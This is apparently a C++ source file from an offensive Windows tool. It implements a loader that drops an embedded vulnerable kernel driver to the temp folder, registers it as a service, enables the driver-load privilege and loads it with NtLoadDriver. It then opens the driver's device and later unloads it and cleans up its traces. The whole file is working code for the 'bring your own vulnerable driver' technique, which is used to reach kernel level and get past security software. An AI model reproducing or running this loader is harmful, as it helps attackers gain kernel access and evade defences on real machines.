#include "vuln_driver_loader.hpp"

#include "drivers/basic_vuln_driver.hpp"
#include "service_registry.hpp"

#include <utils/fs_utils.hpp>
#include <windows.h>

#include <spdlog/spdlog.h>

VulnDriverLoader::VulnDriverLoader(std::shared_ptr<BasicVulnDriver> driver)
    : isLoaded(false)
    , drvPath(std::filesystem::temp_directory_path() / driver->GetName())
    , ntPath(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\" + drvPath.stem().wstring())
    , driver(std::move(driver))
    , registry(std::make_unique<ServiceRegistry>(drvPath))
{
}

VulnDriverLoader::~VulnDriverLoader()
{
    if (isLoaded) {
        Unload();
    }
}

bool VulnDriverLoader::Load()
{
    if (!Utils::FS::CreateFileFromMemory(drvPath, driver->GetData())) {
        spdlog::error("Failed to create vulnerable driver from memory");
        return false;
    }

    if (!registry->CreateRegistryEntry()) {
        spdlog::error("Failed to create driver registry entry");
        return false;
    }

    UNICODE_STRING svcName;
    RtlInitUnicodeString(&svcName, ntPath.c_str());

    NTSTATUS status = NtLoadDriver(&svcName);
    if (!NT_SUCCESS(status)) {
        spdlog::error("NtLoadDriver error: 0x{:X}", status);
        return false;
    }

    if (!driver->OpenDevice()) {
        spdlog::error("Failed to open driver device");
        return false;
    }

    isLoaded = true;
    return true;
}

bool VulnDriverLoader::Unload()
{
    UNICODE_STRING svcName;
    RtlInitUnicodeString(&svcName, ntPath.c_str());

    NTSTATUS status = NtUnloadDriver(&svcName);
    if (!NT_SUCCESS(status)) {
        spdlog::error("NtUnloadDriver error: 0x{}", status);
        return false;
    }

    if (!registry->DeleteRegistryEntry()) {
        spdlog::error("Failed to delete registry entry");
        return false;
    }

    driver->CloseDevice();

    std::error_code ec;
    std::filesystem::remove(drvPath, ec);
    if (ec) {
        spdlog::error("Failed to remove driver file, error code: {}", ec.value());
        return false;
    }

    isLoaded = false;
    return true;
}

bool VulnDriverLoader::EnableLoadPrivileges()
{
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        spdlog::error("Failed to open process token");
        return false;
    }

    LUID luid;
    if (!LookupPrivilegeValueA(NULL, SE_LOAD_DRIVER_NAME, &luid)) {
        CloseHandle(hToken);
        spdlog::error("Failed to lookup privilege value");
        return false;
    }

    TOKEN_PRIVILEGES tp = { };
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        CloseHandle(hToken);
        spdlog::error("Failed to adjust token privileges");
        return false;
    }

    CloseHandle(hToken);
    return true;
}
